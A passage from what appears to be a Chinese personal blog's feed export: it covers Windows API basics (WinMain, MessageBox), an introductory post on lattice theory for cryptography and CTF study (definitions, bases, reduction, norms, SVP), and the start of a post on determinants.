src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526012429481.png" alt="image-20250526012429481"></p><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526012357396.png" alt="image-20250526012357396"></p><ul><li><p>我们要使用上面的库文件，在使用前必须进行声明，而Windows中的一些头文件已经声明好了。我们此时只要<code>#include</code>就行了。</p></li><li><p>介绍一下Windows中比较重要的头文件</p><ul><li><code>windows.h</code>：所有windows头文件的集合（我们一般就include这个头文件即可）</li><li><code>windef.h</code>：Windows数据类型</li><li><code>winbase.h</code>：kernel32的API</li><li><code>wingdi.h</code>：gdi32的API</li><li><code>winuser.h</code>：user32的API</li><li><code>winnt.h</code>：UNICODE字符集支持</li><li>路径大概就在这里<code>C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um</code></li></ul></li></ul><h2 id="窗口程序基本函数">窗口程序基本函数</h2><ul><li>在windows开发窗口程序的过程中主要有几个比较常见也比较基本的函数。我们开发的时候是跑不掉的。</li><li>现在我们就先来介绍一下这几个函数，之后我们在开发的时候就会比较熟悉了。剩下的函数看着开发手册学就行了。</li><li>第一个比较基本的函数就是<code>WinMain</code>函数<ul><li><strong>重要概念：句柄</strong>，对于初学我们将句柄理解为用来找到内存的东西，但是句柄并不是指针。</li><li><code>hInstance</code>：当前程序实例句柄，能找到当前进程所占据的内存</li><li><code>hPrevInstance</code>（这个参数已经被废除，只有在16位的时候有用）</li><li><code>LPSTR lpCmdLine</code>：<code>LPSTR</code>就是<code>char *</code>的别名，所以这边我们应该传入一个字符串命令，类似与Main函数中的<code>argv</code>、<code>argc</code></li><li><code>int nCmdShow</code>：只要的作用就是显示窗口，选项有如下图所示，最大化显示、最小化显示、原样窗口显示</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> WINAPI <span class="title function_">WinMain</span><span class="params">(</span></span><br><span class="line"><span class="params">HINSTANCE hInstance, <span class="comment">// 当前程序的实例句柄</span></span></span><br><span class="line"><span class="params">    HINSTANCE hPrevInstance, <span class="comment">// 当前程序前一个实例句柄</span></span></span><br><span class="line"><span class="params">    LPSTR lpCmdLine, <span class="comment">// 命令行参数字符串</span></span></span><br><span class="line"><span class="params">    <span class="type">int</span> nCmdShow <span class="comment">// 窗口的显示方式</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li>第二个比较基本的函数就是<code>MessageBox</code>这个弹出消息提示框的函数。<ul><li><code>HWND hWnd</code>：父窗口的句柄，就像下图中我们这个提示框的父窗口就是记事本</li><li><code>LPCTSTR lpText</code>：显示提示框中的文字，相当于下图中的<code>是否要将....</code></li><li><code>LPCTSTR IpCaption</code>：显示在标题栏中的文字，相当于下图中的<code>记事本</code></li><li><code>UINT uType</code>：弹出的框<code>只有确定</code>或者<code>有保存、取消</code>或者<code>有保存、不保存、取消</code>，还有弹窗的一些图标按照一些宏定义和或的型式即可。</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">MessageBox</span><span class="params">(</span></span><br><span class="line"><span class="params">HWND hWnd,<span class="comment">//父窗口句柄</span></span></span><br><span class="line"><span class="params">    LPCTSTR IpText, <span class="comment">// 显示在消息框中的文字</span></span></span><br><span class="line"><span class="params">    LPCTSTR IpCaption,<span class="comment">// 显示在标题栏中的文字</span></span></span><br><span class="line"><span class="params">    UINT uType<span class="comment">// 消息框中的按钮、图标显示类型</span></span></span><br><span class="line"><span class="params">)</span>;<span class="comment">// 返回点击的按钮ID</span></span><br></pre></td></tr></table></figure><ul><li>提示框的主要效果就是像这样</li></ul><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526014828491.png" alt="image-20250526014828491"></p><ul><li>接下来编写<code>MessageBox</code>版本的<code>Hello world</code>，编译运行的结果也在下面</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">MessageBox(<span class="number">0</span>, <span class="string">L&quot;Hello World!&quot;</span>, <span class="string">L&quot;Windows高级编程&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/09/16/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Windows%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/Windows%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B1-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E7%B1%BB/image-20250526020104717.png" alt="image-20250526020104717"></p>]]></content>
    
    
    <summary type="html">前言：逆向有非常多的WindowsAPI难搞</summary>
    
    
    
    <category term="开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="Windows开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/Windows%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>格理论初探</title>
    <link href="http://iyheart.github.io/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/"/>
    <id>http://iyheart.github.io/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/</id>
    <published>2025-09-09T16:19:26.000Z</published>
    <updated>2025-10-17T06:56:33.334Z</updated>
    
    <content type="html"><![CDATA[<ul><li>格理论在密码分析和破解这块是个好工具，而CTF又是偏向解题，在密码学这个方向中其实就是对加密过程和密文以及密钥进行密码分析，发现并破解其中潜在的漏洞。所以对于打CTF来说，格理论是不得不学的一个大方向，使用格能破解一些传统加密。</li><li>格理论除了在密码分析和破解这块起妙用之外，还基于格的几个困难问题设计了一些与格相关的加密（目前我还不知道加密的效率怎么样，有听别人说，但是自己没体会到。）</li><li>其实大二就很想入门格密码学，但是由于时间都花在<code>pwn</code>上，有的时候不仅内耗，还比较浮躁，就导致效率比较低。不过现在大三感觉已经在<code>密码学</code>和<code>pwn</code>这两个方向上已经快突破我的平台期了。大二暑假的时候将初等数论学了个大概（还有指数与原根、连分数、超越数、丢番图，其实原本暑假还打算把抽象代数能学多少就学多少，可惜可惜）。目前有个这么打算<code>高等代数</code>和<code>抽象代数</code>学完，就来学<code>代数数论</code>和<code>解析数论</code>。</li></ul><h1 id="参考资料">参考资料</h1><ul><li><p>对于格理论、格密码来说，国外的资料是一大堆的，国内的资料是真没多少。而国外资料又是<code>英文</code>看一页都老半天了。所以在学习格之前，我就先做了点信息收集。</p></li><li><p>首先是王小云写的一篇论文：<a href="http://www.jcr.cacrnet.org.cn/CN/10.13868/j.cnki.jcr.000002">格密码学研究</a>，这篇论文并不是学格相关的理论知识，当做看小说一样看一遍下来，对格的整个发展有一个比较清晰的脉络。还有就是该论文中引用比较多的论文，可以看看这些引用的论文。通过看该论文，可以大致了解一些格理论的一些专有名词，比如格的困难问题<code>CVP、SVP</code>等，以及一些定理还有格与机器学习的交叉<code>LWE</code>问题。</p></li><li><p>目前找到的一本比较系统的写格理论与格密码的书籍了：<code>格理论与密码学 周福才，徐剑编著</code>，这本数是中文的书籍，字还是可以看得比较顺畅的。</p></li><li><p>还有一本就是涵盖内容比较多的一本英文教材：<code>《COMPLEXITY OF LATTICE PROBLEMS A Cryptographic Perspective》Daniele Micciancio、Shafi Goldwasser著</code></p></li><li><p>国外还有一本书：<code>《AnIntroduction to Mathematical Cryptography》Jeffrey Hoffstein、Jill Pipher、Joseph H. Silverman</code></p></li><li><p>接下来就是一些视频了，这个是英文视频：<a href="https://www.bilibili.com/video/BV1bz411v7pS/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=28578c666061830f05313bc422ef65d5">2012年BIU密码学冬令营-04-Basic Cryptanalysis（中文字幕）_哔哩哔哩_bilibili</a></p></li><li><p>这个是中文的一些教学视频：<a href="https://www.bilibili.com/video/BV1RsFAeWEbF?vd_source=bbdaef564df94fc8991902ba22c6761b">全同态加密理论: 格密码的数学基础</a></p></li><li><p>这个代数数论的视频也有讲一部分格，在第<code>125</code>个视频中：<a href="https://www.bilibili.com/video/BV1e54y1a7dY?p=125&amp;vd_source=bbdaef564df94fc8991902ba22c6761b">经典代数数论2021</a></p></li><li><p><code>《数的几何引论》朱尧辰</code></p></li><li><p>参考博客：<a href="https://dexterjie.github.io/2023/07/28/%E5%88%9D%E8%AF%86%E6%A0%BC/">初识格 | DexterJie’Blog</a></p></li></ul><h1 id="格初步认识">格初步认识</h1><h2 id="格相关概念">格相关概念</h2><ul><li>这一部分主要简述一下通过阅读一些资料对格这个概念的一些初步认识。没啥图片都是文字。</li><li>格密码的发展大体分为两条主线：<ul><li>一是从具有悠久历史的格经典数学问题的研究发展到近30多年来高维格困难问题的求解算法以及其计算复杂性理论研究</li><li>二是从使用格困难问题的求解算法<strong>分析非格公钥密码体制</strong>的安全性发展到基于格困难问题的密码体制的设计。</li></ul></li><li>格的研究源于<code>1611</code>年开普勒提出的如下猜想：在一个容器中堆放等半径的小球所能达到的最大密度为$\frac{\pi}{\sqrt{18}}$。</li><li><code>1840</code>年前后，高斯引入了格的概念并证明了：在三维空间中堆球，如果所有的球心构成一个格，那么堆积密度所能达到知道最大值为$\frac{\pi}{\sqrt{18}}$。</li><li>之后在过去的一个半世纪中，<code>Minkowski</code>、<code>Hermite</code>、<code>Bourgain</code>、<code>Hlawka</code>、<code>Kabatyansky</code>、<code>Levenstein</code>、<code>Lovasz</code>、<code>Mahler</code>、<code>Rogers</code>等著名数学家系统地发展了一般几何体的格堆积与覆盖理论。在这一发展过程中，确定一个几何体的<strong>最大格堆积密度</strong>和<strong>最小格覆盖密度</strong>一直是这一个学科的核心问题。（对与格数学的这个发展过程全部都摘抄自王小云教授）。</li></ul><blockquote><p>首先来了解一下格的定义：格是$\R^m$中一类具有周期性结构的离散点的集合，严格地来说，格是m维欧式空间$\R^m$的$n(m\ge n)$个线性无关向量组$b_1,b_2,…,b_n$的所有整系数线性组合即：<br>$$<br>L(\mathbf{B})={\sum^{n}_{i=1}x_ib_i:x_i\in Z,i=1,…,n}<br>$$<br>向量组$\mathbf{b_1},\mathbf{b_2},…,\mathbf{b_n}$称为格的一组基，<strong>同一个格可以用不同的格基表示</strong>，即存在$y_i,\mathbf{c_i}$使得$L(\mathbf{B})=L(\mathbf{C})$，m称为格的维数，n称为格的秩。满足$m=n$的格称为满秩的。通常研究都是研究<strong>满秩的格</strong>也就是<code>m=n</code>这一情况。</p><p><strong>误区</strong>：对于格的定义来说，我们只规定了$x_i$必须为整数，而$\mathbf{b_i}$向量中的数可以不是整数。而格点其实是格中的向量，由于基向量进行加加减减运算后还是一个向量，这个向量其实是可以用坐标表示的。其几何意义就是从<code>(0,0)</code>通过这个向量指向坐标的一个点。所以<strong>格点其实是格向量</strong></p><p>对于格的定义来说，现在感觉还是很抽象，直接上图直接，对于格来说，其几何意义就是平面上、空间上离散而又规律的点。</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913191007867.png" alt="image-20250913191007867"></p><p>而在空间中，也是许许多多有规律的点，在高中化学物质结构中的一些晶体是由原子构成的，都是这么画的有固定，规律的原子排布。（这么一想量子计算机也是从原子等微观角度出发，格是从这些散点出发，二者好像似乎有点联系唉？）</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913191251506.png" alt="image-20250913191251506"></p><p><strong>这里还需要注意</strong>：不同的格基，可能生成的是相同的格</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913191734643.png" alt="image-20250913191734643"></p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913191742382.png" alt="image-20250913191742382"></p><p>注解1：从格的定义出发，如果认真学过线性代数就会发现，这个其实就是线性代数中向量空间基的表达方式。如果使用高中教材向量那一部分来说明的话那其实格的表达其实就相当于向量的一组基底表达。线性代数和高中所学的基底$\vec{c}=x\vec{a}+y\vec{b}$，线性代数的表达就不说了（大一线代没好好学都把时间花在学pwn那边了，所以现在回头再看高等代数。），而线代和高中所学的基底<code>x,y</code>的取值范围都是在实数范围之内的，而格这个定义$x_i\in Z$，说明向量前面的系数是整数。所以格才会是空间中离散的具有周期性的点的集合。</p><p>注解2：从格的引入其实可以知道格与几何关系比较密切；从格的定义来说格又是由向量定义的，向量又与矩阵有关，所以格与线性代数、高等代数关系又非常密切；继续从格的定义来说，基底向量的系数都是整数又彻到整数了，那就和初等数论也扯上关系了。（不知道这算不算强行扯关系，按照自己的理解是这样的）。格与以上的数学分支与基础都有关系，那么绝对与抽象代数也很有关系的。</p><p>注解3：既然格与这么多数学分支有联系，那么这些数学分支中的某些定理都可以使用到格上。而从格的定义使用向量定义并且也可以使用矩阵表示，那么其实矩阵、向量、向量空间的一些性质都<strong>可以使用到格上</strong>。<strong>可以毫不客气地说学格之前先把线性代数学好或者高等代数学好</strong>。</p></blockquote><p>通过对格的逐步了解，了解到了研究个一般研究满秩的格，这里还要做一点说明研究格的这一数学分支似乎被称为<strong>几何数论</strong>，<strong>数的几何引论</strong>，在2025.9.11找到了国内的一本书专门讲几何中的格，也就是传统意义上格用来研究的几何体堆叠问题<code>《数的几何引论》朱尧辰</code></p><blockquote><p><strong>格的基本体(基胞)</strong>：</p><p>格的基本体是由格基向量生成、并作为在$\R^n$中代表每个同余类的一个原胞。若格$\mathbf{L}$由线性无关的基向量$\mathbf{b_1},\mathbf{b_2},…,\mathbf{b_n}$生成即$L(\mathbf{B})={\sum^{n}<em>{i=1}x_ib_i:x_i\in Z,i=1,…,n}$，那么格的基本体则定义为：<br>$$<br>\mathbf{P(B)} ={\sum</em>{i=1}^{n}t_i\mathbf{b_i}|0≤t_i&lt;1}<br>$$<br><strong>误区</strong>：根据基胞的定义，$t_i$是在<code>0~1</code>任意取值的，这就说明，基胞是一个连续的区域，在二维上就是一个平面，在三维上其实就是一个立体图形。而格点或落在平面或者是立体图形的顶点上，并且图形内部是没有格点的。</p><p>如图所示，基胞其实是平行四边形阴影那部分，而格是平行四边形的四个顶点。</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913200242468.png" alt="image-20250913200242468"></p><p>将基胞进行平移整数个单位长度，平行四边形的四个顶点也会被移动到不同的地方，从而构成格。<br><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913200539519.png" alt="image-20250913200539519"></p><p>而到三维或者更高维的立体图形来说，其实可以用化学中物质结构进行类比。晶胞就相当于一个基胞，晶胞顶点上的原子就相当于格点，<strong>相同的基胞构成了晶格</strong>，而<strong>基胞平移会构成格</strong>。</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913200716037.png" alt="image-20250913200716037"></p></blockquote><p>由于研究的一般都是满秩格，而满秩格一般都会有行列式，接下来就需要介绍一下行列式对于格基本体来说的几何意义。</p><blockquote><p><strong>格的行列式的几何意义</strong>：</p><p>格的行列式$del(\mathbf{L})$的值定义为格基本体$\mathbf{P(B)} ={\sum_{i=1}^{n}t_i\mathbf{b_i}|0≤t_i&lt;1}$的有向面积或者说是有向体积。就比如下图，下图中$\mathbf{L} = x_1b_1+x_2b_2,x_1,x_2\in Z$，则$del(\mathbf{L})$的几何意义就是图中平行四边形的面积（但是带有正负号，具体正负要通过右手定则来判断。）</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250913201336510.png" alt="image-20250913201336510"></p></blockquote><h2 id="优质基与劣质基">优质基与劣质基</h2><ul><li>给定一组基向量，它可以通过整数倍的加加减减，得到一个格。但是这个基有好坏之分的，如何定义这个基的好坏呢？通过研究就有如下评判基的好坏的标准：</li></ul><blockquote><p>一组基如果很容易能表示出格中所有的点，那么这组基就是优质基。</p><p>一组基如果表示出格中所有的点非常困难，那么这组基就是劣质基。</p><p>注解：由于格是由基的整数倍加加减减，而不是实数倍加加减减，这就导致了对于有些基来说，表示一个靠近原点的格点，都需要<code>10000000v+20000000u</code>这么大的一个系数，也就是说有些格点非常难表示出来。</p></blockquote><ul><li>我们此时已经给优质基和劣质基下了一个定义，那么就我们就需要研究这两种基有什么特征（这样才能一看图片或者一把这一组基从图中画出来就能判断它是优质基还是劣质基了）。研究优质基和劣质基得到了如下特点：</li></ul><blockquote><p>劣质基具有的特点：</p><ol><li>长度差异非常大：基向量有的长度非常长、有的长度又非常短</li><li>基向量夹角接近共线：基向量之间的夹角接近共线，可以是非常接近<code>0°</code>，也可以是非常接近<code>180°</code></li></ol><p>优质基具有的特点：</p><ol><li>长度差异非常小：基向量的长度都大概差不多</li><li>基向量夹角接近正交：基向量之间的夹角接近<code>90°</code></li></ol></blockquote><ul><li>给出一个图所示：</li></ul><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250914211846300.png" alt="image-20250914211846300"></p><ul><li>优质基生成的格，最典型的优质基其实就是正交向量</li></ul><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250914211917982.png" alt="image-20250914211917982"></p><h2 id="格基规约">格基规约</h2><ul><li>格基规约其实又被称为格基减约，它的英文称为<code>Lattice Basis Reduction</code>，这里就先简单了解一下格基规约的一个概念。</li></ul><blockquote><p>格基规约，都出现了<code>格基</code>了，那么肯定是对表示格的基向量做的操作。由于之前已经有说明了，一个格可以使用不同的基表示。而基有优质基和劣质基之分。那么给定一个劣质基表示的格，其实可以通过某种方法将该格使用优质基表示。</p><p>所以<strong>格基规约</strong>做了这么一件事情：将劣质基转换为优质基，并且俩个基表示的仍然是同一个格，这个操作就被称为格基规约。</p></blockquote><ul><li>对于格基规约来说，目前有俩个比较著名的算法即：LLL算法<code> Lenstra–Lenstra–Lovász lattice basis reduction</code>，BKZ算法<code> Block Korkine-Zolotarev lattice reduction</code></li></ul><h2 id="范数距离">范数(距离)</h2><ul><li>范数其实就指的是距离，从初一开始接触绝对值，一直到学了勾股定理之后得到了求平面直角坐标系两点之间的距离的方法。这其实就是最经典的<code>欧几里得距离</code>。<strong>对于后面所说的向量长度、距离等指的一般都是欧几里得距离</strong></li></ul><p>$$<br>AB = \sqrt{(x_A-x_B)^2+(y_A-y_B)^2}<br>$$</p><ul><li>然后到高中一些奇奇怪怪的题，接触到了曼哈顿距离：</li></ul><p>$$<br>AB = |x_A-x_B|+|y_A-y_B|<br>$$</p><ul><li>到了大学，在学习线性代数或者高等代数的时候，给距离取了一个新的名称<code>范数</code>英文名称为<code>norm</code>，并且给距离下了一个比较统一的定义：</li></ul><p>$$<br>|\mathbf{x}|<em>p=(\sum</em>{i=1}^{n}x^{p}_i)^{\frac{1}{p}}<br>$$</p><ul><li>对于曼哈顿距离，其实就是<code>p=1</code>的情况：</li></ul><p>$$<br>|\mathbf{x}|<em>1=\sum</em>{i=1}^{n}|x_i|<br>$$</p><ul><li>对于欧几里得距离<code>欧几里得范数</code>，其实就是<code>p=2</code>的情况：</li></ul><p>$$<br>|\mathbf{x}|<em>2 = \sqrt{&lt;\mathbf{x},\mathbf{x}&gt;}=\sqrt{\sum^{n}</em>{i=1}x_i^{2}}<br>$$</p><ul><li>还有一种极限的情况如公式如下所示：</li></ul><p>$$<br>|\mathbf{x}|<em>{\infty}=\lim</em>{p \to \infty}|\mathbf{x}|<em>p=\max^{n}</em>{i=1}|x_i|<br>$$</p><h1 id="格的基本问题">格的基本问题</h1><h2 id="最短向量问题svp">最短向量问题(SVP)</h2><blockquote><p>最短向量问题<code>Short Vector Problem,SVP</code>：给定格$\mathbf{L}$，找一个非零格向量$\mathbf{v}$，满足对任意非零向量$\mathbf{u}\in \mathbf{L}$，有$||\mathbf{v}||≤||\mathbf{u}||$。</p><p>注解1：是给定一个格找它的最短向量，而不是给定一组基向量找它的最短向量，只不过我们使用一组基向量来描述整个格。</p><p>注解2：最短向量问题所描述的找一个<code>非零格向量</code>，这个向量有特地说明是<code>格向量</code>（格向量其实就是用基表示出来的，在图中其实就是格点）。也就是说，我们需要寻找的就是给定格中的一个点（也就是格向量），使得对于其他格$\mathbf{L}$的向量来说满足$||\mathbf{v}||≤||\mathbf{u}||$。</p><p>注解3：有时候<strong>最短向量不唯一</strong>，可能有多个。但是最短向量是<strong>成对出现的</strong>，因为如果找到了一个最短向量，那么它的相反向量其实也是一个最短向量。</p><p>注解4：对于一组优质基，该基向量中的其中一个向量很可能就是一个最短向量。对于一组劣质基，该基向量中的一个向量大概率都不是最短向量</p><p><strong>几何理解</strong>：这里直接给出二维的平面图来说明，SVP在二维上可以使用几何来理解。其实就是找到一个格点，以该格点与原点的距离为半径，以原点为圆心，画出一个圆。这个圆满足如下两个条件：</p><ol><li>该圆的内部除了原点外，不能有其他格点</li><li>格点要么在该圆的圆外，要么在该圆的圆上，而在圆上的点其实就是我们要找的最短向量。</li></ol><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250914203603318.png" alt="image-20250914203603318"></p><p>有的时候一个格的最短向量并不唯一</p><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250914204048964.png" alt="image-20250914204048964"></p><ul><li>下面这个是劣质基寻找最短向量的一个例图</li></ul><p><img src="/2025/09/10/%E6%95%B0%E5%AD%A6blog/%E6%A0%BC%E7%90%86%E8%AE%BA%E4%B8%8E%E5%AF%86%E7%A0%81%E5%AD%A6/%E6%A0%BC%E7%90%86%E8%AE%BA%E5%88%9D%E6%8E%A2/image-20250914205647979.png" alt="image-20250914205647979"></p></blockquote><p>类比：个人感觉找最短向量问题有点和寻找模意义下的指数有点像。（好像更准确的来说是寻找模意义下给定一个底数，求这个底数的模幂运算的阶？）</p><h2 id="r-近似最短向量问题r-svp">r-近似最短向量问题(r-SVP)</h2><blockquote></blockquote><h2 id="逐次最小长度问题smp">逐次最小长度问题(SMP)</h2><h2 id="最短线性无关向量问题sivp">最短线性无关向量问题(SIVP)</h2><h2 id="唯一最短向量问题usvp-r">唯一最短向量问题(uSVP-r)</h2><h2 id="最近向量问题cvp">最近向量问题(CVP)</h2><h2 id="有界距离解码问题bdd-r">有界距离解码问题(BDD-r)</h2><h2 id="判断版本r-近似最短问题gapsvp-r">判断版本r-近似最短问题(GapSVP-r)</h2><h1 id="格的基本定理">格的基本定理</h1><h2 id="闵可夫斯基第一定理">闵可夫斯基第一定理</h2><h2 id="界定最短向量长度">界定最短向量长度</h2><h2 id="闵可夫斯基第二定理">闵可夫斯基第二定理</h2><h2 id="blichfeldt-定理">Blichfeldt 定理</h2><h1 id="格相关算法">格相关算法</h1><h2 id="lll算法">LLL算法</h2><h2 id="bkz算法">BKZ算法</h2><h1 id="格密码相关问题">格密码相关问题</h1><h2 id="小整数解问题sis问题">小整数解问题(SIS问题)</h2><h3 id="隐藏子集问题hssp">隐藏子集问题(HSSP)</h3><h2 id="容错学习lwe问题">容错学习(LWE问题)</h2><h3 id="rlwe问题">RLWE问题</h3><h3 id="mlwe问题">MLWE问题</h3><h2 id="隐藏数问题hnp">隐藏数问题(HNP)</h2><h2 id="ntru问题">NTRU问题</h2><h2 id="agcd问题">AGCD问题</h2>]]></content>
    
    
    <summary type="html">前言：非常想入门格</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="格密码理论" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%A0%BC%E5%AF%86%E7%A0%81%E7%90%86%E8%AE%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>高等代数-行列式</title>
    <link href="http://iyheart.github.io/2025/09/09/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E8%A1%8C%E5%88%97%E5%BC%8F/"/>
    <id>http://iyheart.github.io/2025/09/09/%E6%95%B0%E5%AD%A6blog/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0-%E8%A1%8C%E5%88%97%E5%BC%8F/</id>
    <published>2025-09-09T04:52:15.000Z</published>
    <updated>2025-10-22T03:16:51.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="行列式的引入">行列式的引入</h1><ul><li>前面阶梯形矩阵提供了判断方程组的解的办法，但是求出一个矩阵的阶梯形矩阵几乎都已经将方程解出来了，那还要判断方程组的解干嘛。</li><li>所以<strong>为了更容易的得出一个方程组解的情况</strong>，这个时候就需要先利用矩阵去研究了。先来研究二元一次方程组，该方程组如下，其中$a_{11}、a_{21}$不全为0,那不妨设$a_{11}\not=0$。</li></ul><p>$$<br>\begin{cases}<br>a_{11}x_1+a_{12}x_2&amp;=b_1\<br>a_{21}x_1+a_{22}x_2&amp;=b_2\<br>\end{cases}<br>$$</p><ul><li>将它化成增广矩阵后就如下图所示：</li></ul><p>$$<br>\begin{bmatrix}<br>a_{11}&amp;a_{12}&amp;b_1\<br>a_{21}&amp;a_{22}&amp;b_2<br>\end{bmatrix}<br>$$</p><ul><li>​使用初等行变换就转化成了阶梯形矩阵，通分一下，就会出现两种情况：</li></ul><p>$$<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; 